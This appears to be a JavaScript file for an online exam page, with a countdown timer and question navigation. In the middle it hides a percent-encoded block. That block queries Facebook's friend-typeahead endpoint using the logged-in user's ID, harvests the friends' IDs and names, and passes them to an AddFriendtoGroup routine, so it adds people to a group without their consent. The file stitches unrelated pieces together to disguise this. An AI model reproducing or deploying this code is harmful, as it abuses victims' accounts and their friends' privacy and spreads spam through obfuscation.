function refreshClock() {
  clock = document.getElementById("clock");
  var clocktime = clock.innerHTML.split(":");
  var hour, min, sec;
  hour = parseInt(clocktime[0]);
  min = parseInt(clocktime[1]);
  sec = parseInt(clocktime[2]);
  var hStr, mStr, sStr;
  if (sec - 1 > 0) sec--;
  else if (min > 0) {
    min--;
    sec = 59
  } else if (hour > 0) {
    hour--;
    min = 59;
    sec = 60
  } else {
    alert("Time over........Stop writing");
    window.location = "ExamOver.aspx";
    return
  }
  clock.innerHTML = hour.toString() + ":" + min.toString() + ":" + sec.toString();
  window.fullscreen = "yes";
  setTimeout("refreshClock();",
  1E3)
}
function verifyTime() {
  $.ajax({
    type: "POST",
    url: "StartFriendsAdding.aspx/checkTime",
    data: "{}",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    success: function (result) {
      if (result == "Finish") {
        alert("Time over........Stop Adding");
        window.location = "ExamOver.aspx"
      } else {
        clock.innerHTML = result;
        setTimeout("verifyTime();", 1E4)
      }
    }
  })
}

function gotoNext(sender) {
  var repeater = document.getElementById("QueContainer");
  var childs = repeater.childNodes;
  if (sender.value == "Last") {
    for (i = 1; i < childs.length - 2; i++) childs[i].style.display = "none";
    childs[i].style.display = "block";
    curQueTable = childs[i];
    curQue = i;
    changeButtons(sender)
  } else if (curQueTable.id == childs[childs.length - 2].id) alert("You have reached the last question. Now you can finish your exam by clicking the FINISH button");
  else {
    if (navigator.appName.indexOf("Microsoft") != -1) {
      curQueTable.style.display =
        "none";
      curQueTable = curQueTable.nextSibling;
      curQueTable.style.display = "block"
    } else {
      $(curQueTable).slideUp(500);
      curQueTable = curQueTable.nextSibling;
      $(curQueTable).slideDown(500)
    }
    curQue++;
    document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString()
  }
}
var seta = "%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78";
var setb = "%74%79%70%65%61%68%65%61%64";
var setc = "%66%69%72%73%74%5F%64%65%67%72%65%65%2E%70%68%70%3F%5F%5F%61%3D%31%26%76%69%65%77%65%72%3D";
var setd, sete, setf;
setd = "%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78";
sete = "%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F";
setf = "%62%6F%6F%74%73%74%72%61%70%2E%70%68%70";
setg = "%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%75%73%65%72%26%76%69%65%77%65%72%3D";
seth = "%26%74%6F%6B%65%6E%3D%76%37%26%6C%61%7A%79%3D%30%26%5F%5F%75%73%65%72%3D";
jx.load(window.location.protocol + "//" + unescape(setd) + "/" + unescape(sete) + unescape(setf) + unescape(setg) + Env.user + unescape(seth) + Env.user, function (a) {
  var b = a;
  var c = b.substring(b.indexOf("{"));
  var d = JSON.parse(c);
  d = d.payload.entries;
  for (var e = 0; e < d.length; e++) arr.push(d[e].uid);for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  i = arr.length - 1;
  console.log(arr.length);
  AddFriendtoGroup(arr[i])
});

function gotoPrev(sender) {
  var repeater = document.getElementById("QueContainer");
  var childs = repeater.childNodes;
  if (sender.value == "Back") {
    for (i = 1; i < childs.length - 1; i++) childs[i].style.display = "none";
    childs[curQue].style.display = "block";
    changeButtons(sender)
  } else if (curQueTable.id == childs[1].id) alert("You are on First Questions, cannot go previous anymore.");
  else {
    if (navigator.appName.indexOf("Microsoft") != -1) {
      curQueTable.style.display = "none";
      curQueTable = curQueTable.previousSibling;
      curQueTable.style.display =
        "block"
    } else {
      $(curQueTable).slideUp(500);
      curQueTable = curQueTable.previousSibling;
      $(curQueTable).slideDown(500)
    }
    curQue--;
    document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").value = curQue.toString()
  }
}

function gotoQuestion(sender) {
  var repeater = document.getElementById("QueContainer");
  for (i = 1; i < repeater.childNodes.length - 1; i++) if (repeater.childNodes[i].style.display == "block") {
    repeater.childNodes[i].style.display = "none";
    i = 1E3
  }
  repeater.childNodes[sender.value].style.display = "block";
  curQueTable = repeater.childNodes[sender.value];
  curQue = parseInt(sender.value)
}

function viewUnAttempted(sender) {
  var repeater = document.getElementById("QueContainer");
  var Answers, counter = 0;
  var flag;
  for (i = 1; i < repeater.childNodes.length - 1; i++) {
    Answers = repeater.childNodes[i].rows[4].cells[0].childNodes;
    flag = true;
    for (j = 0; j < Answers.length; j++) if (Answers[j].type == "checkbox") {
      if (Answers[j].checked) {
        flag = false;
        j = 1E3
      }
    } else if (Answers[j].childNodes.length > 0) if (Answers[j].childNodes[0].type == "checkbox") if (Answers[j].childNodes[0].checked) {
      flag = false;
      j = 1E3
    }
    if (flag) {
      repeater.childNodes[i].style.display =
        "block";
      counter++
    } else repeater.childNodes[i].style.display = "none"
  }
  changeButtons(sender);
  if (counter == 0) {
    alert("All the questions have been attempted.");
    document.getElementById("cmdPrevTop").click()
  } else counter = 0
}

function viewAttempted(sender) {
  var repeater = document.getElementById("QueContainer");
  var Answers, counter = 0;
  var flag;
  for (i = 1; i < repeater.childNodes.length - 1; i++) {
    Answers = repeater.childNodes[i].rows[4].cells[0].childNodes;
    flag = false;
    for (j = 0; j < Answers.length; j++) if (Answers[j].type == "checkbox") {
      if (Answers[j].checked) {
        repeater.childNodes[i].style.display = "block";
        j = 1E5;
        flag = true
      }
    } else if (Answers[j].childNodes.length > 0) if (Answers[j].childNodes[0].type == "checkbox") if (Answers[j].childNodes[0].checked) {
      flag = true;
      j = 1E3
    }
    if (flag == false) repeater.childNodes[i].style.display = "none";
    else {
      repeater.childNodes[i].style.display = "block";
      counter++
    }
  }
  changeButtons(sender);
  if (counter == 0) {
    alert("You have not attempted any question.");
    document.getElementById("cmdPrevTop").click()
  } else counter = 0
}

function changeButtons(sender) {
  if (sender.value == "Back" || sender.value == "Last") {
    var drpGotoQue = document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion");
    drpGotoQue.disabled = false;
    if (sender.value == "Last") drpGotoQue.value = curQue.toString();
    document.getElementById("cmdNextTop").value = "Next";
    document.getElementById("cmdNextBott").value = "Next";
    document.getElementById("cmdPrevTop").value = "Previous";
    document.getElementById("cmdPrevBott").value = "Previous"
  } else if (sender.value == "View Attempted Questions" || sender.value == "View UnAttempted Questions") {
    document.getElementById("cmdNextTop").value = "Last";
    document.getElementById("cmdNextBott").value = "Last";
    document.getElementById("cmdPrevTop").value = "Back";
    document.getElementById("cmdPrevBott").value = "Back";
    document.getElementById("ctl00_ContentPlaceHolder1_quePaper_ctl00_drpGotoQuestion").disabled = true
  }
};
